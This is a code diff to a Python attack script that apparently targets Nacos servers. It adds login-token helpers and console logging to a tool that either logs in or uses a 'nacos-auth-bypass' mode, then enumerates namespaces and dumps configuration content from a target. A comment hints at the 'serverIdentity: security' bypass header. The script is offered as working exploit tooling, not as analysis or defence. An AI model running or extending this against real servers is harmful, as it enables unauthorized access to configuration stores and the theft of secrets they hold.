@@ -19,9 +19,37 @@ def get_auth_token(target: str, username: str, password: str) -> str:
         'username': username,
         'password': password,
     }
-    resp = requests.post(url, headers=headers, data=data, proxies=proxy)
-    resp_dict = resp.json()
-    token = resp_dict.get("accessToken")
+    try:
+        resp = requests.post(url, headers=headers, data=data, proxies=proxy)
+        resp_dict = resp.json()
+        token = resp_dict.get("accessToken")
+    except Exception:
+        pass
+    
+    
+    return token
+
+def get_auth_token_no_users(target: str, username: str, password: str) -> str:
+    token = ""
+    path = "/v1/auth/login"
+    url = target + path
+    headers = {
+        'Accept': 'application/json',
+        # X-Requested-With: XMLHttpRequest
+        # Authorization: null
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+    }
+    data = {
+        'username': username,
+        'password': password,
+        'namespaceId': ''
+    }
+    try:
+        resp = requests.post(url, headers=headers, data=data, proxies=proxy)
+        token = resp.headers.get("Authorization")
+    except Exception:
+        pass
     return token
 
 
@@ -109,17 +137,29 @@ if __name__ == '__main__':
         exit()
 
     target = sys.argv[1].rstrip('/')
+    print("[+] Target: ", target)
     token = ""
     bypass = False
     if len(sys.argv) == 4:
+        print("[+] Username: ", sys.argv[2])
+        print("[+] Password: ", sys.argv[3])
+        print("\n")
         token = get_auth_token(target, sys.argv[2], sys.argv[3])
+        if token == None:
+            token = get_auth_token_no_users(target, sys.argv[2], sys.argv[3])
     if len(sys.argv) == 3:
         if sys.argv[2] != "nacos-auth-bypass":
+            print("[+] Token: ", sys.argv[2])
+            print("\n")
             token = sys.argv[2]
         else:
             # header = { "serverIdentity": "security"}
+            print("[+] Bypass")
+            print("\n")
             bypass = True
-    
+
+
+
     namespaces = get_namespaces(target, token, bypass)
     dump_config_content(target, namespaces, token, bypass)
     # parser_config(dump_config_content(target, namespaces, token, bypass))
